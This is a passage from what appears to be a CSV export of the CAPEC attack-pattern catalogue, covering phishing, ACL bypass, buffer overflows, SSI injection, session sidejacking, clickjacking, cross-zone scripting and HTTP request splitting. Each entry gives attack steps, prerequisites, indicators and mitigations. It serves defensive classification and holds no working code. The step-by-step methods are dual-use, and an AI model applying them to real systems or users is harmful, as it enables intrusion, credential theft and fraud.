information.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:89::NATURE:CanPrecede:CAPEC ID:543::NATURE:CanPrecede:CAPEC ID:611::NATURE:CanPrecede:CAPEC ID:630::NATURE:CanPrecede:CAPEC ID:631::NATURE:CanPrecede:CAPEC ID:632::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Obtain domain name and certificate to spoof legitimate site] This optional step can be used to help the attacker impersonate the legitimate site more convincingly. The attacker can use homograph attacks to convince users that they are using the legitimate website. Note that this step is not required for phishing attacks, and many phishing attacks simply supply URLs containing an IP address and no SSL certificate.:TECHNIQUE:Optionally obtain a domain name that visually looks similar to the legitimate site's domain name. An example is www.paypaI.com vs. www.paypal.com (the first one contains a capital i, instead of a lower case L):TECHNIQUE:Optionally obtain a legitimate SSL certificate for the new domain name.::STEP:2:PHASE:Explore:DESCRIPTION:[Explore legitimate website and create duplicate] An attacker creates a website (optionally at a URL that looks similar to the original URL) that closely resembles the website that they are trying to impersonate. That website will typically have a login form for the victim to put in their authentication credentials. There can be different variations on a theme here.:TECHNIQUE:Use spidering software to get copy of web pages on legitimate site.:TECHNIQUE:Manually save copies of required web pages from legitimate site.:TECHNIQUE:Create new web pages that have the legitimate site's look and feel, but contain completely new content.::STEP:3:PHASE:Exploit:DESCRIPTION:[Convince user to enter sensitive information on attacker's site.] An attacker sends an e-mail to the victim that has some sort of a call to action to get the user to click on the link included in the e-mail (which takes the victim to attacker's website) and log in. The key is to get the victim to believe that the e-mail is coming from a legitimate entity with which the victim does business and that the website pointed to by the URL in the e-mail is the legitimate website. A call to action will usually need to sound legitimate and urgent enough to prompt action from the user.:TECHNIQUE:Send the user a message from a spoofed legitimate-looking e-mail address that asks the user to click on the included link.:TECHNIQUE:Place phishing link in post to online forum.::STEP:4:PHASE:Exploit:DESCRIPTION:[Use stolen credentials to log into legitimate site] Once the attacker captures some sensitive information through phishing (login credentials, credit card information, etc.) the attacker can leverage this information. For instance, the attacker can use the victim's login credentials to log into their bank account and transfer money to an account of their choice.:TECHNIQUE:Log in to the legitimate site using another user's supplied credentials::\",\"::An attacker needs to have a way to initiate contact with the victim. Typically that will happen through e-mail.::An attacker needs to correctly guess the entity with which the victim does business and impersonate it. Most of the time phishers just use the most popular banks/services and send out their hooks to many potential victims.::An attacker needs to have a sufficiently compelling call to action to prompt the user to take action.::The replicated website needs to look extremely similar to the original website and the URL used to get to that website needs to look like the real URL of the said business entity.::\",\"::SKILL:Basic knowledge about websites: obtaining them, designing and implementing them, etc.:LEVEL:Medium::\",\"::Some web development tools to put up a fake website.::\",\"::You receive an e-mail from an entity that you are not even a customer of prompting you to log into your account.::You receive any e-mail that provides you with a link which takes you to a website on which you need to enter your log in information.::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Do not follow any links that you receive within your e-mails and certainly do not input any login credentials on the page that they take you too. Instead, call your Bank, PayPal, eBay, etc., and inquire about the problem. A safe practice would also be to type the URL of your bank in the browser directly and only then log in. Also, never reply to any e-mails that ask you to provide sensitive information of any kind.::\",\"::The target gets an official looking e-mail from their bank stating that their account has been temporarily locked due to suspected unauthorized activity and that they need to click on the link included in the e-mail to log in to their bank account in order to unlock it. The link in the e-mail looks very similar to that of their bank and once the link is clicked, the log in page is the exact replica. The target supplies their login credentials after which they are notified that their account has now been unlocked and that everything is fine. An attacker has just collected the target's online banking information which can now be used by the attacker to log into the target's bank account and transfer money to a bank account of the attackers' choice.::An adversary may use BlueJacking, or Bluetooth Phishing to send unsolicited contact cards, messages, or pictures to nearby devices that are listening via Bluetooth. These messages may contain phishing content.::\",\"::451::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1566:ENTRY NAME:Phishing::::TAXONOMY NAME:ATTACK:ENTRY ID:1598:ENTRY NAME:Phishing for Information::\",\"\","
  },
  "doc-29b8d6b7ee592937f2b418789f3951f6": {
    "content": "'ID,Name,Abstraction,Status,Description,Alternate Terms,Likelihood Of Attack,Typical Severity,Related Attack Patterns,Execution Flow,Prerequisites,Skills Required,Resources Required,Indicators,Consequences,Mitigations,Example Instances,Related Weaknesses,Taxonomy Mappings,Notes\n1,\"Accessing Functionality Not Properly Constrained by ACLs\",Standard,Draft,\"In applications, particularly web applications, access to functionality is mitigated by an authorization framework. This framework maps Access Control Lists (ACLs) to elements of the application's functionality; particularly URL's for web apps. In the case that the administrator failed to specify an ACL for a particular element, an attacker may be able to access it with impunity. An attacker with the ability to access functionality not properly constrained by ACLs can obtain sensitive information and possibly compromise the entire application. Such an attacker can access resources that must be available only to users at a higher privilege level, can access management sections of the application, or can run queries for data that they otherwise not supposed to.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:122::NATURE:CanPrecede:CAPEC ID:17::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey] The attacker surveys the target application, possibly as a valid and authenticated user:TECHNIQUE:Spidering web sites for all available links:TECHNIQUE:Brute force guessing of resource names:TECHNIQUE:Brute force guessing of user names / credentials:TECHNIQUE:Brute force guessing of function names / actions::STEP:2:PHASE:Explore:DESCRIPTION:[Identify Functionality] At each step, the attacker notes the resource or functionality access mechanism invoked upon performing specific actions:TECHNIQUE:Use the web inventory of all forms and inputs and apply attack data to those inputs.:TECHNIQUE:Use a packet sniffer to capture and record network traffic:TECHNIQUE:Execute the software in a debugger and record API calls into the operating system or important libraries. This might occur in an environment other than a production environment, in order to find weaknesses that can be exploited in a production environment.::STEP:3:PHASE:Experiment:DESCRIPTION:[Iterate over access capabilities] Possibly as a valid user, the attacker then tries to access each of the noted access mechanisms directly in order to perform functions not constrained by the ACLs.:TECHNIQUE:Fuzzing of API parameters (URL parameters, OS API parameters, protocol parameters)::\",\"::The application must be navigable in a manner that associates elements (subsections) of the application with ACLs.::The various resources, or individual URLs, must be somehow discoverable by the attacker::The administrator must have forgotten to associate an ACL or has associated an inappropriately permissive ACL with a particular navigable resource.::\",\"::SKILL:In order to discover unrestricted resources, the attacker does not need special tools or skills. They only have to observe the resources or access mechanisms invoked as each action is performed and then try and access those access mechanisms directly.:LEVEL:Low::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::In a J2EE setting, administrators can associate a role that is impossible for the authenticator to grant users, such as NoAccess, with all Servlets to which access is guarded by a limited number of servlets visible to, and accessible by, the user. Having done so, any direct access to those protected Servlets will be prohibited by the web container. In a more general setting, the administrator must mark every resource besides the ones supposed to be exposed to the user as accessible by a role impossible for the user to assume. The default security setting must be to deny access and then grant access only to those resources intended by business logic.::\",\"::Implementing the Model-View-Controller (MVC) within Java EE's Servlet paradigm using a Single front controller pattern that demands that brokered HTTP requests be authenticated before hand-offs to other Action Servlets. If no security-constraint is placed on those Action Servlets, such that positively no one can access them, the front controller can be subverted.::\",\"::276::285::434::693::732::1191::1193::1220::1297::1311::1314::1315::1318::1320::1321::1327::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1574.010:ENTRY NAME:Hijack Execution Flow: ServicesFile Permissions Weakness::\",\"\",\n10,\"Buffer Overflow via Environment Variables\",Detailed,Draft,\"This attack pattern involves causing a buffer overflow through manipulation of environment variables. Once the adversary finds that they can modify an environment variable, they may try to overflow associated buffers. This attack leverages implicit trust often placed in environment variables.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:100::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target application] The adversary identifies a target application or program to perform the buffer overflow on. In this attack the adversary looks for an application that loads the content of an environment variable into a buffer.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.:TECHNIQUE:Change the values of environment variables thought to be used by the application to contain excessive data. If the program is loading the value of the environment variable into a buffer, this could cause a crash and an attack vector will be found.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft overflow content] The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary crafts the payload in such a way that the overwritten return address is replaced with one of the adversary's choosing.:TECHNIQUE:Create malicious shellcode that will execute when the program execution is returned to it.:TECHNIQUE:Use a NOP-sled in the overflow content to more easily slide into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs::STEP:4:PHASE:Exploit:DESCRIPTION:[Overflow the buffer] Using the injection vector, the adversary injects the crafted overflow content into the buffer.::\",\"::The application uses environment variables.::An environment variable exposed to the user is vulnerable to a buffer overflow.::The vulnerable environment variable uses untrusted data.::Tainted data used in the environment variables is not properly validated. For instance boundary checking is not done before copying the input data to a buffer.::\",\"::SKILL:An attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector. The result can be a DoS.:LEVEL:Low::SKILL:Exploiting a buffer overflow to inject malicious code into the stack of a software system or even the heap can require a higher skill level.:LEVEL:High::\",\"\",\"::If the application does bound checking, it should fail when the data source is larger than the size of the destination buffer. If the application's code is well written, that failure should trigger an alert.::\",\"::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Do not expose environment variable to the user.::Do not use untrusted data in your environment variables.::Use a language or compiler that performs automatic bounds checking::There are tools such as Sharefuzz [REF-2] which is an environment variable fuzzer for Unix that support loading a shared library. You can use Sharefuzz to determine if you are exposing an environment variable vulnerable to buffer overflow.::\",\"::A buffer overflow in sccw allows local users to gain root access via the $HOME environmental variable. See also: CVE-1999-0906::A buffer overflow in the rlogin program involves its consumption of the $TERM environmental variable. See also: CVE-1999-0046::\",\"::120::302::118::119::74::99::20::680::733::697::\",\"TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Buffer Overflow via Environment Variables::\",\"\",\n100,\"Overflow Buffers\",Standard,Draft,\"Buffer Overflow attacks target improper or missing bounds checking on buffer operations, typically triggered by input injected by an adversary. As a consequence, an adversary is able to write past the boundaries of allocated buffer regions in memory, causing a program crash or potentially redirection of execution as per the adversaries' choice.\",\"\",High,Very High,\"::NATURE:ChildOf:CAPEC ID:123::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target application] The adversary identifies a target application or program to perform the buffer overflow on. Adversaries often look for applications that accept user input and that perform manual memory management.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find injection vector] The adversary identifies an injection vector to deliver the excessive content to the targeted application's buffer.:TECHNIQUE:Provide large input to a program or application and observe the behavior. If there is a crash, this means that a buffer overflow attack is possible.::STEP:3:PHASE:Experiment:DESCRIPTION:[Craft overflow content] The adversary crafts the content to be injected. If the intent is to simply cause the software to crash, the content need only consist of an excessive quantity of random data. If the intent is to leverage the overflow for execution of arbitrary code, the adversary crafts the payload in such a way that the overwritten return address is replaced with one of the adversary's choosing.:TECHNIQUE:Create malicious shellcode that will execute when the program execution is returned to it.:TECHNIQUE:Use a NOP-sled in the overflow content to more easily slide into the malicious code. This is done so that the exact return address need not be correct, only in the range of all of the NOPs::STEP:4:PHASE:Exploit:DESCRIPTION:[Overflow the buffer] Using the injection vector, the adversary injects the crafted overflow content into the buffer.::\",\"::Targeted software performs buffer operations.::Targeted software inadequately performs bounds-checking on buffer operations.::Adversary has the capability to influence the input to buffer operations.::\",\"::SKILL:In most cases, overflowing a buffer does not require advanced skills beyond the ability to notice an overflow and stuff an input variable with content.:LEVEL:Low::SKILL:In cases of directed overflows, where the motive is to divert the flow of the program or application as per the adversaries' bidding, high level skills are required. This may involve detailed knowledge of the target system architecture and kernel.:LEVEL:High::\",\"::None: No specialized resources are required to execute this type of attack. Detecting and exploiting a buffer overflow does not require any resources beyond knowledge of and access to the target system.::\",\"::An attack designed to leverage a buffer overflow and redirect execution as per the adversary's bidding is fairly difficult to detect. An attack aimed solely at bringing the system down is usually preceded by a barrage of long inputs that make no sense. In either case, it is likely that the adversary would have resorted to a few hit-or-miss attempts that will be recorded in the system event logs, if they exist.::\",\"::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Use a language or compiler that performs automatic bounds checking.::Use secure functions not vulnerable to buffer overflow.::If you have to use dangerous functions, make sure that you do boundary checking.::Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.::Use OS-level preventative functionality. Not a complete solution.::Utilize static source code analysis tools to identify potential buffer overflow weaknesses in the software.::\",\"::The most straightforward example is an application that reads in input from the user and stores it in an internal buffer but does not check that the size of the input data is less than or equal to the size of the buffer. If the user enters excessive length data, the buffer may overflow leading to the application crashing, or worse, enabling the user to cause execution of injected code.::Many web servers enforce security in web applications through the use of filter plugins. An example is the SiteMinder plugin used for authentication. An overflow in such a plugin, possibly through a long URL or redirect parameter, can allow an adversary not only to bypass the security checks but also execute arbitrary code on the target web server in the context of the user that runs the web server process.::\",\"::120::119::131::129::805::680::\",\"TAXONOMY NAME:WASC:ENTRY ID:07:ENTRY NAME:Buffer Overflow::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Buffer overflow attack::\",\"\",\n101,\"Server Side Include (SSI) Injection\",Detailed,Draft,\"An attacker can use Server Side Include (SSI) Injection to send code to a web application that then gets executed by the web server. Doing so enables the attacker to achieve similar results to Cross Site Scripting, viz., arbitrary code execution and information disclosure, albeit on a more limited scale, since the SSI directives are nowhere near as powerful as a full-fledged scripting language. Nonetheless, the attacker can conveniently gain access to sensitive files, such as password files, and execute shell commands.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:253::NATURE:CanPrecede:CAPEC ID:600::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine applicability] The adversary determines whether server side includes are enabled on the target web server.:TECHNIQUE:Look for popular page file names. The attacker will look for .shtml, .shtm, .asp, .aspx, and other well-known strings in URLs to help determine whether SSI functionality is enabled.:TECHNIQUE:Fetch .htaccess file. In Apache web server installations, the .htaccess file may enable server side includes in specific locations. In those cases, the .htaccess file lives inside the directory where SSI is enabled, and is theoretically fetchable from the web server. Although most web servers deny fetching the .htaccess file, a misconfigured server will allow it. Thus, an attacker will frequently try it.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find Injection Point] Look for user controllable input, including HTTP headers, that can carry server side include directives to the web server.:TECHNIQUE:Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.::STEP:3:PHASE:Exploit:DESCRIPTION:[Inject SSI] Using the found injection point, the adversary sends arbitrary code to be inlcuded by the application on the server side. They may then need to view a particular page in order to have the server execute the include directive and run a command or open a file on behalf of the adversary.::\",\"::A web server that supports server side includes and has them enabled::User controllable input that can carry include directives to the web server::\",\"::SKILL:The attacker needs to be aware of SSI technology, determine the nature of injection and be able to craft input that results in the SSI directives being executed.:LEVEL:Medium::\",\"::None: No specialized resources are required to execute this type of attack. Determining whether the server supports SSI does not require special tools, and nor does injecting directives that get executed. Spidering tools can make the task of finding and following links easier.::\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::\",\"::Set the OPTIONS IncludesNOEXEC in the global access.conf file or local .htaccess (Apache) file to deny SSI execution in directories that do not need them::All user controllable input must be appropriately sanitized before use in the application. This includes omitting, or encoding, certain characters or strings that have the potential of being interpreted as part of an SSI directive::Server Side Includes must be enabled only if there is a strong business reason to do so. Every additional component enabled on the web server increases the attack surface as well as administrative overhead::\",\"::Consider a website hosted on a server that permits Server Side Includes (SSI), such as Apache with the Options Includes directive enabled. Whenever an error occurs, the HTTP Headers along with the entire request are logged, which can then be displayed on a page that allows review of such errors. A malicious user can inject SSI directives in the HTTP Headers of a request designed to create an error. When these logs are eventually reviewed, the server parses the SSI directives and executes them.::\",\"::97::74::20::\",\"TAXONOMY NAME:WASC:ENTRY ID:36:ENTRY NAME:SSI Injection::::TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Server-Side Includes (SSI) Injection::\",\"\",\n102,\"Session Sidejacking\",Detailed,Draft,\"Session sidejacking takes advantage of an unencrypted communication channel between a victim and target system. The attacker sniffs traffic on a network looking for session tokens in unencrypted traffic. Once a session token is captured, the attacker performs malicious actions by using the stolen token with the targeted application to impersonate the victim. This attack is a specific method of session hijacking, which is exploiting a valid session token to gain unauthorized access to a target system or information. Other methods to perform a session hijacking are session fixation, cross-site scripting, or compromising a user or server machine and stealing the session token.\",\"\",High,High,\"::NATURE:ChildOf:CAPEC ID:593::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Detect Unprotected Session Token Transfer] The attacker sniffs on the wireless network to detect unencrypted traffic that contains session tokens.:TECHNIQUE:The attacker uses a network sniffer tool like ferret or hamster to monitor the wireless traffic at a WiFi hotspot while examining it for evidence of transmittal of session tokens in unencrypted or recognizably encrypted form. An attacker applies their knowledge of the manner by which session tokens are generated and transmitted by various target systems to identify the session tokens.::STEP:2:PHASE:Experiment:DESCRIPTION:[Capture session token] The attacker uses sniffing tools to capture a session token from traffic.::STEP:3:PHASE:Experiment:DESCRIPTION:[Insert captured session token] The attacker attempts to insert a captured session token into communication with the targeted application to confirm viability for exploitation.::STEP:4:PHASE:Exploit:DESCRIPTION:[Session Token Exploitation] The attacker leverages the captured session token to interact with the targeted application in a malicious fashion, impersonating the victim.::\",\"::An attacker and the victim are both using the same WiFi network.::The victim has an active session with a target system.::The victim is not using a secure channel to communicate with the target system (e.g. SSL, VPN, etc.)::The victim initiated communication with a target system that requires transfer of the session token or the target application uses AJAX and thereby periodically rings home asynchronously using the session token::\",\"::SKILL:Easy to use tools exist to automate this attack.:LEVEL:Low::\",\"::A packet sniffing tool, such as wireshark, can be used to capture session information.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::\",\"::Make sure that HTTPS is used to communicate with the target system. Alternatively, use VPN if possible. It is important to ensure that all communication between the client and the server happens via an encrypted secure channel.::Modify the session token with each transmission and protect it with cryptography. Add the idea of request sequencing that gives the server an ability to detect replay attacks.::\",\"::The attacker and the victim are using the same WiFi public hotspot. When the victim connects to the hotspot, they has a hosted e-mail account open. This e-mail account uses AJAX on the client side which periodically asynchronously connects to the server side and transfers, amongst other things, the user's session token to the server. The communication is supposed to happen over HTTPS. However, the configuration in the public hotspot initially disallows the HTTPS connection (or any other connection) between the victim and the hosted e-mail servers because the victim first needs to register with the hotspot. The victim does so, but their e-mail client already defaulted to using a connection without HTTPS, since it was denied access the first time. Victim's session token is now flowing unencrypted between the victim's browser and the hosted e-mail servers. The attacker leverages this opportunity to capture the session token and gain access to the victim's hosted e-mail account.::\",\"::294::522::523::319::614::\",\"\",\"\",\n103,\"Clickjacking\",Standard,Draft,\"An adversary tricks a victim into unknowingly initiating some action in one system while interacting with the UI from a seemingly completely different, usually an adversary controlled or intended, system.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:173::\",\"::STEP:1:PHASE:Experiment:DESCRIPTION:[Craft a clickjacking page] The adversary utilizes web page layering techniques to try to craft a malicious clickjacking page:TECHNIQUE:The adversary leveraged iframe overlay capabilities to craft a malicious clickjacking page:TECHNIQUE:The adversary leveraged Flash file overlay capabilities to craft a malicious clickjacking page:TECHNIQUE:The adversary leveraged Silverlight overlay capabilities to craft a malicious clickjacking page:TECHNIQUE:The adversary leveraged cross-frame scripting to craft a malicious clickjacking page::STEP:2:PHASE:Exploit:DESCRIPTION:[Adversary lures victim to clickjacking page] Adversary utilizes some form of temptation, misdirection or coercion to lure the victim to loading and interacting with the clickjacking page in a way that increases the chances that the victim will click in the right areas.:TECHNIQUE:Lure the victim to the malicious site by sending the victim an e-mail with a URL to the site.:TECHNIQUE:Lure the victim to the malicious site by manipulating URLs on a site trusted by the victim.:TECHNIQUE:Lure the victim to the malicious site through a cross-site scripting attack.::STEP:3:PHASE:Exploit:DESCRIPTION:[Trick victim into interacting with the clickjacking page in the desired manner] The adversary tricks the victim into clicking on the areas of the UI which contain the hidden action controls and thereby interacts with the target system maliciously with the victim's level of privilege.:TECHNIQUE:Hide action controls over very commonly used functionality.:TECHNIQUE:Hide action controls over very psychologically tempting content.::\",\"::The victim is communicating with the target application via a web based UI and not a thick client::The victim's browser security policies allow at least one of the following JavaScript, Flash, iFrames, ActiveX, or CSS.::The victim uses a modern browser that supports UI elements like clickable buttons (i.e. not using an old text only browser)::The victim has an active session with the target system.::The target system's interaction window is open in the victim's browser and supports the ability for initiating sensitive actions on behalf of the user in the target system::\",\"::SKILL:Crafting the proper malicious site and luring the victim to this site are not trivial tasks.:LEVEL:High::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution::\",\"::If using the Firefox browser, use the NoScript plug-in that will help forbid iFrames.::Turn off JavaScript, Flash and disable CSS.::When maintaining an authenticated session with a privileged target system, do not use the same browser to navigate to unfamiliar sites to perform other activities. Finish working with the target system and logout first before proceeding to other tasks.::\",\"::A victim has an authenticated session with a site that provides an electronic payment service to transfer funds between subscribing members. At the same time, the victim receives an e-mail that appears to come from an online publication to which they subscribe with links to today's news articles. The victim clicks on one of these links and is taken to a page with the news story. There is a screen with an advertisement that appears on top of the news article with the 'skip this ad' button. Eager to read the news article, the user clicks on this button. Nothing happens. The user clicks on the button one more time and still nothing happens. In reality, the victim activated a hidden action control located in a transparent layer above the 'skip this ad' button. The ad screen blocking the news article made it likely that the victim would click on the 'skip this ad' button. Clicking on the button, actually initiated the transfer of $1000 from the victim's account with an electronic payment service to an adversary's account. Clicking on the 'skip this ad' button the second time (after nothing seemingly happened the first time) confirmed the transfer of funds to the electronic payment service.::\",\"::1021::\",\"TAXONOMY NAME:OWASP Attacks:ENTRY NAME:Clickjacking::\",\"\",\n104,\"Cross Zone Scripting\",Standard,Draft,\"An attacker is able to cause a victim to load content into their web-browser that bypasses security zone controls and gain access to increased privileges to execute scripting code or other web objects such as unsigned ActiveX controls or applets. This is a privilege elevation attack targeted at zone-based web-browser security.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:233::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Find systems susceptible to the attack] Find systems that contain functionality that is accessed from both the internet zone and the local zone. There needs to be a way to supply input to that functionality from the internet zone and that original input needs to be used later on a page from a local zone.:TECHNIQUE:Leverage knowledge of common local zone functionality on targeted platforms to guide attempted injection of code through relevant internet zone mechanisms. In some cases this may be due to standard system configurations enabling shared functionality between internet and local zones. The attacker can search for indicators that these standard configurations are in place.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find the insertion point for the payload] The attacker first needs to find some system functionality or possibly another weakness in the system (e.g. susceptibility to cross site scripting) that would provide the attacker with a mechanism to deliver the payload (i.e. the code to be executed) to the user. The location from which this code is executed in the user's browser needs to be within the local machine zone.:TECHNIQUE:Finding weaknesses in functionality used by both privileged and unprivileged users.::STEP:3:PHASE:Exploit:DESCRIPTION:[Craft and inject the payload] Develop the payload to be executed in the higher privileged zone in the user's browser. Inject the payload and attempt to lure the victim (if possible) into executing the functionality which unleashes the payload.:TECHNIQUE:The attacker makes it as likely as possible that the vulnerable functionality into which they have injected the payload has a high likelihood of being used by the victim.:TECHNIQUE:Leverage cross-site scripting vulnerability to inject payload.::\",\"::The target must be using a zone-aware browser.::\",\"::SKILL:Ability to craft malicious scripts or find them elsewhere and ability to identify functionality that is running web controls in the local zone and to find an injection vector into that functionality:LEVEL:Medium::\",\"::None: No specialized resources are required to execute this type of attack.::\",\"\",\"::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::\",\"::Disable script execution.::Ensure that sufficient input validation is performed for any potentially untrusted data before it is used in any privileged context or zone::Limit the flow of untrusted data into the privileged areas of the system that run in the higher trust zone::Limit the sites that are being added to the local machine zone and restrict the privileges of the code running in that zone to the bare minimum::Ensure proper HTML output encoding before writing user supplied data to the page::\",\"::There was a cross zone scripting vulnerability discovered in Skype that allowed one user to upload a video with a maliciously crafted title that contains a script. Subsequently, when the victim attempts to use the add video to chat feature on attacker's video, the script embedded in the title of the video runs with local zone privileges. Skype is using IE web controls to render internal and external HTML pages. Add video to chat uses these web controls and they are running in the Local Zone. Any user who searched for the video in Skype with the same keywords as in the title field, would have the attackers' code executing in their browser with local zone privileges to their host machine (e.g. applications on the victim's host system could be executed).::\",\"::250::638::285::116::20::\",\"\",\"\",\n105,\"HTTP Request Splitting\",Detailed,Stable,\"An adversary abuses the flexibility and discrepancies in the parsing and interpretation of HTTP Request messages by different intermediary HTTP agents (e.g., load balancer, reverse proxy, web caching proxies, application firewalls, etc.) to split a single HTTP request into multiple unauthorized and malicious HTTP requests to a back-end HTTP agent (e.g., web server). See CanPrecede relationships for possible consequences.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:220::NATURE:PeerOf:CAPEC ID:34::NATURE:CanPrecede:CAPEC ID:115::NATURE:CanPrecede:CAPEC ID:141::NATURE:CanPrecede:CAPEC ID:63::NATURE:CanPrecede:CAPEC ID:593::NATURE:CanPrecede:CAPEC ID:148::NATURE:CanPrecede:CAPEC ID:154::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey network to identify target] The adversary performs network reconnaissance by monitoring relevant traffic to identify the network path and parsing of the HTTP messages with the goal of identifying potential targets.:TECHNIQUE:Scan networks to fingerprint HTTP infrastructure and monitor HTTP traffic to identify HTTP network path with a tool such as a Network Protocol Analyzer.::STEP:1:PHASE:Experiment:DESCRIPTION:[Identify vulnerabilities in targeted HTTP infrastructure and technologies] The adversary sends a variety of benign/ambiguous HTTP requests to observe responses from HTTP infrastructure in order to identify differences/discrepancies in the interpretation and parsing of HTTP requests by examining supported HTTP protocol versions, HTTP headers, syntax checking and input filtering.::STEP:2:PHASE:Experiment:DESCRIPTION:[Cause differential HTTP responses by experimenting with identified HTTP Request vulnerabilities] The adversary sends maliciously crafted HTTP requests with custom strings and embedded web scripts and objects in HTTP headers to interfere with the parsing of intermediary and back-end HTTP infrastructure, followed by normal/benign HTTP request from the adversary or a random user. The intended consequences of the malicious HTTP requests will be observed in the HTTP infrastructure response to the normal/benign HTTP request to confirm applicability of identified vulnerabilities in the adversary's plan of attack.:TECHNIQUE:Continue the monitoring of HTTP traffic.:TECHNIQUE:Utilize different sequences of special characters (CR - Carriage Return, LF - Line Feed, HT - Horizontal Tab, SP - Space and etc.) to bypass filtering and back-end encoding and to embed: additional HTTP Requests with their own headers malicious web scripts into parameters of HTTP Request headers (e.g., browser cookies like Set-Cookie or Ajax web/browser object parameters like XMLHttpRequest) adversary chosen encoding (e.g., UTF-7) to utilize additional special characters (e.g., > and <) filtered by the target HTTP agent. Note that certain special characters and character encoding may be applicable only to intermediary and front-end agents with rare configurations or that are not RFC compliant.:TECHNIQUE:Follow an unrecognized (sometimes a RFC compliant) HTTP header with a subsequent HTTP request to potentially cause the HTTP request to be ignored and interpreted as part of the preceding HTTP request.::STEP:1:PHASE:Exploit:DESCRIPTION:[Perform HTTP Request Splitting attack] Using knowledge discovered in the experiment section above, smuggle a message to cause one of the consequences.:TECHNIQUE:Leverage techniques identified in the Experiment Phase.::\",\"::An additional intermediary HTTP agent such as an application firewall or a web caching proxy between the adversary and the second agent such as a web server, that sends multiple HTTP messages over same network connection.::Differences in the way the two HTTP agents parse and interpret HTTP requests and its headers.::HTTP headers capable of being user-manipulated.::HTTP agents running on HTTP/1.0 or HTTP/1.1 that allow for Keep Alive mode, Pipelined queries, and Chunked queries and responses.::\",\"::SKILL:Detailed knowledge on HTTP protocol: request and response messages structure and usage of specific headers.:LEVEL:Medium::SKILL:Detailed knowledge on how specific HTTP agents receive, send, process, interpret, and parse a variety of HTTP messages and headers.:LEVEL:Medium::SKILL:Possess knowledge on the exact details in the discrepancies between several targeted HTTP agents in path of an HTTP message in parsing its message structure and individual headers.:LEVEL:Medium::\",\"::Tools capable of crafting malicious HTTP messages and monitoring HTTP messages responses.::\",\"::Differences in requests processed by the two agents. This requires careful monitoring or a capable log 